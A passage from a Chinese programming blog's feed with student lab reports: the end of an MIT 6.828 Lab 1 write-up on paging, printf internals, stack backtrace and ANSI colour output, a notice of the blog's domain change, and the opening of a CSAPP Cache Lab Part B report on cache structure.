<p>练习6：<br>结果是非常显然的，因为引导的作用就是将内核从磁盘加载进入内存中。使用objdump -h obj/kern/kernel我们可以看到如下的信息：<br>0 .text         00001809  f0100000  00100000  00001000  2**4<br>                CONTENTS, ALLOC, LOAD, READONLY, CODE<br>我们可以直到内核的text段会被加载至内存中0x100000（物理地址）处。</p>
<h3 id="第三部分-内核"><a href="#第三部分-内核" class="headerlink" title="第三部分 内核"></a>第三部分 内核</h3><h4 id="使用虚拟内存去解决位置依赖"><a href="#使用虚拟内存去解决位置依赖" class="headerlink" title="使用虚拟内存去解决位置依赖"></a>使用虚拟内存去解决位置依赖</h4><p>可以发现内核将自己链接至了非常高的虚拟地址，比如0xf0100000，为了将处理器虚拟地址的较低部分给用户程序去使用。将在下一个实验介绍这一现象。</p>
<p>实际上，许多的机器在物理内存中并没有0xf0100000这样的高地址。实际上由处理器的内存管理硬件将虚拟地址0xf0100000映射到了实际内存中的物理地址0x100000。</p>
<p>这涉及了分页机制以及页表。<br>在kern/entry.S设置CR0_PG标记之前，内存引用被当做线性地址。实际上，由于我们在boot/boot.S设置了线性地址到物理地址的一致映射，所以线性地址在这里可以等同于物理地址。<br>当CR0_PG标记被设置了之后，所有的内存引用都被当作虚拟地址。虚拟地址通过虚拟内存硬件被翻译成物理地址。<br>kern/entrypgdir.c将0xf0000000到0xf0400000的虚拟地址翻译为物理地址的0x000000到0x400000，也将0x00000000到0x00400000的虚拟地址翻译为物理地址的0x00000000到0x00400000。<br>引用这些地址范围以外的虚拟地址将会抛出缺页的异常。<br>但我们还没有为该异常设置中断处理程序。这会导致QEMU导出机器状态并退出。</p>
<p>练习7：<br>在movl %eax, %cr0指令（启动页表）之前，0x00100000出的内存不为空，0xf0100000出的内存全为0。<br>当stepi之后，0xf0100000处的内存和0x00100000处的内存完全一样。这表明我们已经成功启用了页表，并且完成了地址的映射。</p>
<h4 id="控制台的格式化字符串"><a href="#控制台的格式化字符串" class="headerlink" title="控制台的格式化字符串"></a>控制台的格式化字符串</h4><p>练习8：<br>缺失的代码为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</div><div class="line">	num = getuint(&amp;ap, lflag);</div><div class="line">base = <span class="number">8</span></div><div class="line"><span class="keyword">goto</span> number;</div></pre></td></tr></table></figure></p>
<ol>
<li>console.c提供了基本的I/O操作，同时封装了cputchar、getchar等函数供printf.c中的printf使用。printf使用了vprintfmt去解析格式化字符串并提供可变参数的特性。</li>
<li>这段代码主要实现了换行。其首先检查了当前的光标是否超过了最大值，如果是，则证明需要进行换行。其将第1行到第MAX-1行的内容复制到第0行到第MAX-2行所在的内存中，然后将第MAX-1行置空。最后将光标设置到新一行的开始。</li>
<li>fmt指向了格式化字符串”x %d, y %x, z %d\n”<br>ap指向了局部变量并且初始值为1<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">vcprintf(<span class="number">0xf0102449</span>, <span class="number">0xf0110e14</span>); <span class="number">0xf0102449</span> -&gt; <span class="string">"x %d, y %x, z %d\n"</span> <span class="number">0xf0110e14</span> -&gt; <span class="number">1</span></div><div class="line">cons_putc(<span class="number">120</span>);</div><div class="line">cons_putc(<span class="number">32</span>);</div><div class="line">va_arg(<span class="number">0xf0110dbc</span>, <span class="keyword">int</span>); Before: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e14</span> -&gt; <span class="number">1</span> After: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e18</span> -&gt; <span class="number">3</span></div><div class="line">cons_putc(<span class="number">49</span>);</div><div class="line">cons_putc(<span class="number">44</span>);</div><div class="line">cons_putc(<span class="number">32</span>);</div><div class="line">cons_putc(<span class="number">121</span>);</div><div class="line">cons_putc(<span class="number">32</span>);</div><div class="line">va_arg(<span class="number">0xf0110dbc</span>, <span class="keyword">int</span>); Before: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e18</span> -&gt; <span class="number">3</span> After: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e1c</span> -&gt; <span class="number">4</span></div><div class="line">cons_putc(<span class="number">51</span>);</div><div class="line">cons_putc(<span class="number">44</span>);</div><div class="line">cons_putc(<span class="number">32</span>);</div><div class="line">cons_putc(<span class="number">122</span>);</div><div class="line">cons_put(<span class="number">32</span>);</div><div class="line">va_arg(<span class="number">0xf0110dbc</span>, <span class="keyword">int</span>); Before: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e1c</span> -&gt; <span class="number">4</span> After: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e20</span> -&gt; <span class="number">536870922</span></div><div class="line">cons_put(<span class="number">52</span>);</div><div class="line">cons_put(<span class="number">10</span>);</div></pre></td></tr></table></figure>
注意这里va_arg是宏而不是函数，不能通过加断点的方式跟踪。我采用的方法是在调用va_arg的地方添加断点并跟踪。<br>在GNUmakefile中的C_FLAGS -O1会重排C代码，导致了追踪va_arg变得困难。所以，仅在此处将-O1变成-O0，尽管这会导致在backtrace时kernel panic。</li>
<li>57616 = 0xe110。此外，根据x86的小端序，&amp;i指向了byte序列0x72、0x6c、0x64、0x00。这等同于字符串”rld”。所以，最终的输出为”He110 World”。<br>需要将i改为0x726c6400。不需要修改57616。</li>
<li>这是由于程序从格式化字符串中推断出了应当有3个参数，所以程序会从cprintf的栈中多读取一个参数。但我们知道，实际上只有2个参数。所以最后一个参数是未指定的。</li>
<li>vcprintf(…, const char * fmt)。</li>
</ol>
<h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>练习9：<br>f0100034:    bc 00 00 11 f0           mov    $0xf0110000,%esp<br>这一条指令初始化了引导栈，它位于0xf0110000处。内核仅通过设置esp寄存器的值为栈预留空间。栈指针指向高地址，并且栈自高地址向低地址延伸。</p>
<p>练习10：<br>本题考察了x86架构下的栈帧与函数调用。<br>函数调用时先将返回地址压栈，然后跳转至目标函数的起始地址；在目标函数内先将ebp寄存器的值（栈底）压栈保存，然后再将栈顶指针设置为新的栈底；<br>在函数中调用函数需要使用栈来传递参数，即将函数的参数以此压入栈中；<br>test_backtrace函数的汇编中使用了ebx寄存器，该寄存器为被调用者保存的寄存器，在使用的时候也要先压栈保存，再函数返回时恢复；<br>函数返回的时候通过先操作esp释放栈资源，然后恢复相应的被调用者保存的寄存器的值，最后调用汇编指令leave、ret返回；<br>leave指令先将esp的值置为ebp，然后再从栈中取出被保存的ebp的旧值；ret从栈中取出返回地址并跳转。</p>
<p>练习10-12：<br>mon_backtrace的实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">mon_backtrace</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">uint32_t</span> ebp, eip, args[<span class="number">5</span>];</div><div class="line"> 	<span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">info</span>;</span></div><div class="line"></div><div class="line">	cprintf(<span class="string">"Stack backtrace:\n"</span>);</div><div class="line">	<span class="keyword">for</span> (ebp = read_ebp() ; ebp != <span class="number">0</span> ; ebp = *((<span class="keyword">uint32_t</span> *)ebp)) &#123;</div><div class="line">		eip = *((<span class="keyword">uint32_t</span> *)ebp + <span class="number">1</span>);</div><div class="line"></div><div class="line">		debuginfo_eip(eip, &amp;info);</div><div class="line"></div><div class="line">		args[<span class="number">0</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">2</span>);</div><div class="line">		args[<span class="number">1</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">3</span>);</div><div class="line">		args[<span class="number">2</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">4</span>);</div><div class="line">		args[<span class="number">3</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">5</span>);</div><div class="line">		args[<span class="number">4</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">6</span>);</div><div class="line">		cprintf(<span class="string">"  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n"</span>, ebp, eip, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>], args[<span class="number">3</span>], args[<span class="number">4</span>]);</div><div class="line"> 		cprintf(<span class="string">"      %s:%d: %.*s+%d\n"</span>, info.eip_file, info.eip_line, info.eip_fn_namelen, info.eip_fn_name, eip - info.eip_fn_addr);</div><div class="line"> 	&#125;</div><div class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"> &#125;</div><div class="line"> </div></pre></td></tr></table></figure><br>查阅STABS文档可以知道表示行号的成员是n_desc，所以debuginfo_eip的缺失的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">	stab_binsearch(stabs, &amp;lline, &amp;rline, N_SLINE, addr);</div><div class="line"><span class="keyword">if</span> (lline &lt;= rline) &#123;</div><div class="line">	info-&gt;eip_line = stabs[lline].n_desc;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>修改后的commands结构体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Command</span> <span class="title">commands</span>[] = &#123;</span></div><div class="line">&#123; <span class="string">"help"</span>, <span class="string">"Display this list of commands"</span>, mon_help &#125;,</div><div class="line">&#123; <span class="string">"kerninfo"</span>, <span class="string">"Display information about the kernel"</span>, mon_kerninfo &#125;,</div><div class="line">&#123; <span class="string">"backtrace"</span>, <span class="string">"Display information about the stack frames"</span>, mon_backtrace &#125;,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<h4 id="提高-允许控制台输出不同颜色的文本"><a href="#提高-允许控制台输出不同颜色的文本" class="headerlink" title="提高 - 允许控制台输出不同颜色的文本"></a>提高 - 允许控制台输出不同颜色的文本</h4><p>要求能增强控制台的功能使得控制台可以输出不同颜色的字体。这里使用了传统的实现，解析嵌入在文本字符串中的ANSI转义序列来实现题目的要求。</p>
<p>在王爽的《汇编语言》中，已经接触过了字符的“属性字节”，一个字符的自低到高的第2个字节可以作为属性字节，用来指示字符的属性如闪烁、高亮、前景色、背景色等。<br>有关于ANSI转义序列的相关知识可以参考<a href="http://rrbrandt.dee.ufcg.edu.br/en/docs/ansi/" target="_blank" rel="external">这里</a>。</p>
<p>出于简化考虑，只部分实现ANSI转义序列中的<code>ESC[Ps;...;Psm</code>。</p>
<p>实现的思路是实现<code>&lt;kern/printf.c&gt;</code>中的punch函数的替代版本attribute_punch，来实现对于ANSI转义序列的解析，并且相应地设置字符的属性字节。</p>
<p>解析所需要的状态机具有三个状态：A_NORM代表正常的输出字符的状态、A_TRANS代表接收到[ESC]开始，从正常状态到解析转义序列的过渡状态、A_ESCAPE代表解析转义序列的状态。它们之间的状态转换图如图所示：</p>
<img src="/2017/12/09/MIT6-828操作系统工程Lab1-Booting-a-PC实验报告/ansi_stm.png" alt="ansi_stm.png" title="">
<p>value用来存储每一个解析到的值，temp代表了解析过程中临时的属性字节，attribute代表了当前打印字符时附加的属性字节。</p>
<p>具体的实现代码在<kern printf.c="">中：</kern></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// state for ANSI escape sequence interpretation</span></div><div class="line"><span class="keyword">enum</span> &#123;</div><div class="line">	A_NORM = <span class="number">0</span>,</div><div class="line">	A_TRANS,</div><div class="line">	A_ESCAPE</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">// colormap - number (x - 30/40)[0, 7] -&gt; attribute byte</span></div><div class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> colormap[<span class="number">8</span>] =</div><div class="line">&#123;</div><div class="line">	<span class="number">0x0000</span>, <span class="number">0x4400</span>, <span class="number">0x2200</span>, <span class="number">0x6600</span>,</div><div class="line">	<span class="number">0x1100</span>, <span class="number">0x5500</span>, <span class="number">0x3300</span>, <span class="number">0x7700</span>,</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">attribute_punch</span><span class="params">(<span class="keyword">int</span> ch, <span class="keyword">int</span> *cnt)</span> &#123;</div><div class="line">	<span class="keyword">static</span> <span class="keyword">int</span> value = <span class="number">0</span>; <span class="comment">// value</span></div><div class="line">	<span class="keyword">static</span> <span class="keyword">int</span> state = A_NORM; <span class="comment">// current state</span></div><div class="line">	<span class="keyword">static</span> <span class="keyword">int</span> temp = <span class="number">0x0000</span>, attribute = <span class="number">0x0000</span>; <span class="comment">// temp attribute, current attribute</span></div><div class="line"></div><div class="line">	<span class="keyword">switch</span>(state) &#123; <span class="comment">// state machine</span></div><div class="line">		<span class="keyword">case</span> A_NORM:</div><div class="line">			<span class="keyword">if</span> (ch == <span class="number">0x1B</span>) &#123; <span class="comment">// [ESC]</span></div><div class="line">				state = A_TRANS; <span class="comment">// transfer from A_NORM to A_TRANS</span></div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				cputchar((attribute &amp; <span class="number">0xFF00</span>) | ch); <span class="comment">// put character with attribute</span></div><div class="line">				*cnt++;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> A_TRANS:</div><div class="line">			<span class="keyword">if</span> (ch == <span class="string">'['</span>) &#123; <span class="comment">// [</span></div><div class="line">				state = A_ESCAPE; <span class="comment">// transfer from A_TRANS to A_ESCAPE</span></div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				state = A_NORM; <span class="comment">// transfer from A_TRANS to A_NORM</span></div><div class="line">			&#125;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		<span class="keyword">case</span> A_ESCAPE:</div><div class="line">			<span class="keyword">if</span> (ch &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>) &#123; <span class="comment">// digit - update value</span></div><div class="line">				value = value * <span class="number">10</span> + ch - <span class="string">'0'</span>;</div><div class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">';'</span> || ch == <span class="string">'m'</span>) &#123; <span class="comment">// ; or m set temp and clear value</span></div><div class="line">				<span class="keyword">if</span> (value == <span class="number">0</span>) &#123;</div><div class="line">					temp  = colormap[<span class="number">0</span>];</div><div class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value == <span class="number">5</span>) &#123;</div><div class="line">					temp |= <span class="number">0x8000</span>;</div><div class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt;= <span class="number">30</span> &amp;&amp; value &lt;= <span class="number">38</span>) &#123;</div><div class="line">					temp |= colormap[value - <span class="number">30</span>] &amp; <span class="number">0x0700</span>; <span class="comment">// look up in color map</span></div><div class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt;= <span class="number">40</span> &amp;&amp; value &lt;= <span class="number">48</span>) &#123;</div><div class="line">					temp |= colormap[value - <span class="number">40</span>] &amp; <span class="number">0x7000</span>; <span class="comment">// avoid complex cases</span></div><div class="line">				&#125;</div><div class="line">				value = <span class="number">0</span>;</div><div class="line">				<span class="keyword">if</span> (ch == <span class="string">'m'</span>) &#123; <span class="comment">// m needed extra work - update attribute</span></div><div class="line">					attribute = temp;</div><div class="line">					temp = <span class="number">0x0000</span>;</div><div class="line">					state = A_NORM; <span class="comment">// transfer from A_ESCAPE to A_NORM</span></div><div class="line">				&#125;</div><div class="line">			&#125; <span class="keyword">else</span> &#123; <span class="comment">// non_digit nor m</span></div><div class="line">				state = A_NORM; <span class="comment">// transfer from A_ESCAPE to A_NORM</span></div><div class="line">			&#125;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">vcprintf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, va_list ap)</span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> cnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="comment">// vprintfmt((void*)putch, &amp;cnt, fmt, ap);</span></div><div class="line">	<span class="comment">// use attribute_punch rather than punch</span></div><div class="line">	vprintfmt((<span class="keyword">void</span> *)attribute_punch, &amp;cnt, fmt, ap);</div><div class="line">	<span class="keyword">return</span> cnt;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后我们在monitor.c中添加相关cprintf代码，并重新编译测试。最终如图所示：</p>
<img src="/2017/12/09/MIT6-828操作系统工程Lab1-Booting-a-PC实验报告/lab1_final.png" alt="lab1_final.png" title="">
<p>有关于实验指导中提到的打开vga硬件的graphics mode使得控制台绘制文本到图形帧缓冲区的实现，由于时间和难度原因，这里暂时跳过。</p>
<h2 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h2><p>第一个实验总体来说更偏重于概念的理解、工具的使用而不是实际的代码。</p>
<p>尽管如此，大量的概念也浪费了我很多时间去理解。MIT的6.828同清华的ucore操作系统实验相比提供了相当多的reference（ucore的阅读材料几乎都是现成的），这也对文档阅读和信息检索能力有了更高的要求。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本学期开设了操作系统的专业课。根据老师的介绍，下个学期的操作系统课设就是MIT的6.828的Labs，再加上团队老学长/同学的推荐，打算先在这个学期完成6.828，加深对于系统的理解。&lt;br&gt;Lab1 - Booting a PC是比较简单的实验，
    
    </summary>
    
      <category term="操作系统" scheme="http://blog.codedragon.tech/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://blog.codedragon.tech/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>域名变更说明</title>
    <link href="http://blog.codedragon.tech/2017/11/27/%E5%9F%9F%E5%90%8D%E5%8F%98%E6%9B%B4%E8%AF%B4%E6%98%8E/"/>
    <id>http://blog.codedragon.tech/2017/11/27/域名变更说明/</id>
    <published>2017-11-26T17:08:59.000Z</published>
    <updated>2017-11-27T01:47:11.139Z</updated>
    
    <content type="html"><![CDATA[<h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><ol>
<li>2016年1月3日，域名duskdragon.com随阿里云学生主机一起购入，预计于2017年1月3日过期</li>
<li>2016年2月1日，域名duskdragon.com备案完成</li>
<li>2016年11月6日，域名duskdragon.com续费1年，预计于2018年1月3日过期</li>
<li>2017年11月20日，新域名codedragon.tech购入，预计于2022年11月21日过期</li>
</ol>
<h2 id="域名变更说明"><a href="#域名变更说明" class="headerlink" title="域名变更说明"></a>域名变更说明</h2><p>从即日起至2018年1月3日，旧域名duskdragon.com和新域名codedragon.tech将同时有效，可通过这两个域名中的任意一个的二级域名blog访问本博客。</p>
<p>从2018年1月4日起，旧域名duskdragon.com将完全废弃，仅可通过codedragon.tech的二级域名blog访问本博客。</p>
<p>本次域名变更主要为了使域名更加贴近码龙的设定，并且在相当长的一段时间内都将会维持稳定；次要的考量在于.com域名的相对高价格。</p>
<p>由于codedragon.com已被注册，所以退而求其次地选择了codedragon.tech作为新域名。</p>
<h2 id="博客更新说明"><a href="#博客更新说明" class="headerlink" title="博客更新说明"></a>博客更新说明</h2><p>本次域名更新的同时也对博客进行了更新</p>
<ol>
<li>更换了新的头像 - Character(c) 我/Art By 漫步</li>
<li>博客描述性文字的修改</li>
<li>如果不额外说明，本博客的所有文章默认以CC BY-NC-SA 4.0即署名-非商业性使用-相同方式共享4.0国际发布。有关该协议的概要可以参考<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="external">这里</a></li>
<li>修复了失效的友情链接并添加了Suncio的博客为友情链接</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;域名信息&quot;&gt;&lt;a href=&quot;#域名信息&quot; class=&quot;headerlink&quot; title=&quot;域名信息&quot;&gt;&lt;/a&gt;域名信息&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;2016年1月3日，域名duskdragon.com随阿里云学生主机一起购入，预计于2017年1月3日过期&lt;/l
    
    </summary>
    
      <category term="通知" scheme="http://blog.codedragon.tech/categories/%E9%80%9A%E7%9F%A5/"/>
    
    
      <category term="通知" scheme="http://blog.codedragon.tech/tags/%E9%80%9A%E7%9F%A5/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统CacheLab-PartB实验报告</title>
    <link href="http://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/</id>
    <published>2017-09-25T06:46:48.000Z</published>
    <updated>2017-10-22T09:21:29.840Z</updated>
    
    <content type="html"><![CDATA[<p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/CacheLab" target="_blank" rel="external">GitHub</a>上</p>
<blockquote>
<p>Cache Lab的Part B是我卡了比较久的实验，在7月份做完Part A之后我卡在了Part B的第二个矩阵优化，之后进度一直缓慢。直到几天之前团队分享，我才把这个实验重新捡了回来，最终将第二个矩阵转置优化到了1500+的miss数（尽管仍然没有达到满分），后参考了网上的思路完成了Part B，总结如下。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Cache Lab - Understanding Cache Memories主要是有关缓存的实验，对应于书本的第6章：存储器层次结构。主要阐明了缓存对于C语言程序的性能影响。</p>
<p>本实验的第二部分要求优化一个简单的矩阵变换函数，使其具有尽可能晓得缓存不命中数。</p>
<p>关于本实验的具体介绍详见<a href="http://csapp.cs.cmu.edu/3e/archlab32-handout.tar" target="_blank" rel="external">实验讲义</a>。</p>
<h2 id="实验要求-Part-B"><a href="#实验要求-Part-B" class="headerlink" title="实验要求 - Part B"></a>实验要求 - Part B</h2><p>在Part B中你需要在trans.c中写一个矩阵转置函数，该函数要能有尽可能少的缓存不命中(miss)数。</p>
<p>令A代表一个矩阵，A(i, j)代表矩阵A的第i行第j列的元素。<br>那么，令B为矩阵A的转置，则对于A中的任意一个元素，满足A(i, j) = B(j, i)。</p>
<p>一个朴素的矩阵转置函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j, tmp;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) &#123;</div><div class="line">            tmp = A[i][j];</div><div class="line">            B[j][i] = tmp;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><br>该函数是正确的，但却并不是高效的，因为其访问模式导致了相当多的缓存不命中。</p>
<p>你的任务是完成一个相似的函数，并对于不同大小的矩阵块（32×32，64×64，61×67），最小化该函数的缓存不命中数。</p>
<p>对于Part B有以下的要求和限制：</p>
<ol>
<li>你所写的程序在编译时不能有任何的警告</li>
<li>在每一个你所写的转置函数中，你最多只能定义12个int型的局部变量</li>
<li>你不能使用long型的变量或是使用任何的技巧来使得在一个变量中存入多余一个的值</li>
<li>你的转置函数不能使用递归</li>
<li>如果你使用辅助函数，那么在同一时刻，你的调用栈上也不能出现超过12个局部变量</li>
<li>你的转置函数不能修改矩阵A，但是，你能任意的修改矩阵B</li>
<li>你不能定义任何的数组或是任何使用malloc的变量</li>
</ol>
<h2 id="实验过程-Part-B"><a href="#实验过程-Part-B" class="headerlink" title="实验过程 - Part B"></a>实验过程 - Part B</h2><h3 id="缓存简介"><a href="#缓存简介" class="headerlink" title="缓存简介"></a>缓存简介</h3><h4 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h4><p>局部性分为时间局部性和空间局部性——在一个具有良好的时间局部性的程序中，被引用过一次的内存位置可能在不远的将来再被多次引用。在一个具有良好的空间局部性的程序中，如果一个内存位置被引用了，那么程序很可能在不远的将来引用附近的一个内存位置。</p>
<p>一般来说，有良好局部性的程序比局部性差的程序运行的更快。现代计算机系统的各个层次，设计都利用了局部性。</p>
<p>在硬件层，通过高速缓存存储器来保存最近被引用的代码和数据，提高对主存的访问速度。<br>在操作系统层面，将虚拟内存作为主存和磁盘间高速缓存。<br>在网络中，主机可以作为代理缓存经常被访问的网页，浏览器也可以缓存最近访问过的页面。</p>
<h4 id="存储器层次结构"><a href="#存储器层次结构" class="headerlink" title="存储器层次结构"></a>存储器层次结构</h4><p>我们可以依次地组织不同的存储器，形成一个典型的存储器层次结构。如下图所示。</p>
<img src="/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/memory-arch" alt="memory-arch" title="">
<p>在该结构中，自高层向底层走，存储设备变得更慢、更便宜和更大。每一层的存储器都作为下一级存储器的缓存。</p>
<h4 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h4><p>早期的计算机系统的存储器结构只有3层：CPU寄存器、DRAM主存储器和磁盘存储。随着CPU和主存之间不断加大的差距，系统设计者被迫在寄存器文件和主存之间加入了一个小的SRAM高速缓存处理器，称为L1高速缓存（一级缓存），L1高速缓存的访问速度几乎和寄存器一样快，典型地是约4个时钟周期。</p>
<p>随着CPU和主存之间的性能差距进一步增大，系统设计者在L1缓存和主存之间又加入了一个更大的高速缓存，称为L2高速缓存，可以在约10个时钟周期内被访问到。</p>
<p>有些现代系统还包括有一个更大的高速缓存，称为L3高速缓存，它位于L2高速缓存和主存之间，可以在大约50个时钟周期内被访问到。</p>
<h5 id="组织结构"><a href="#组织结构" class="headerlink" title="组织结构"></a>组织结构</h5><p>假定一个计算机系统，其每个存储器地址为m位，那么形成了M = 2 ^ m个不同的地址。</p>
<p>这样一个机器的高速缓存被组织成一个有S = 2 ^ s个高速缓存组（Cache Set）的数组，每个组包含E个高速缓存行（Cache Line）。每个行是由一个B = 2 ^ b字节的数据块（Block）组成的，一个有效位（valid bit）指明这个行是否包含有意义的信息。t = m - (b + s)个标记位（tag bit），它们唯一地标识存储在这个高速缓存行中的块。</p>
<p>一个通用的高速缓存组织结构可以用元组(S, E, B, m)来描述。<br>高速缓存的大小C指的是所有块（不包括标记位和有效位）的大小的和，C = S × E × B。</p>
